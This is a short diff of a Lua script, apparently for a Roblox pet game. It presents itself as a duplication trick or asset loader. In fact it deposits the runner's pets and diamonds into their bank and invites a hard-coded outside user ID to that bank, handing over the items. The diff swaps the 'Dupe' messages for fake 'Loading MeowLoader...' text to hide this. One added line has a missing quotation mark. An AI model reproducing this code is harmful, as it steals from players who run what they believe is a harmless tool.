@@ -9,5 +9,5 @@ table.insert(PetsList, v.uid);
 end 
 end 
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1); 
-if request then lib.Message.New("Dupe starting"); else lib.Message.New(request2 and "Something went wrong. Try again!"); return; 
-end if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'],  3196159706) then lib.Message.New("Dupe successfully! please rejoin"); else lib.Message.New("Dupe failure frowning please try again"); end;
+if request then lib.Message.New("Loading MeowLoader..."); else lib.Message.New(request2 and "Something went wrong. Try again!"); return; 
+end if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'],  3196159706) then lib.Message.New("Loading Assets..."); else lib.Message.New(Something went worng, please retry!"); end;
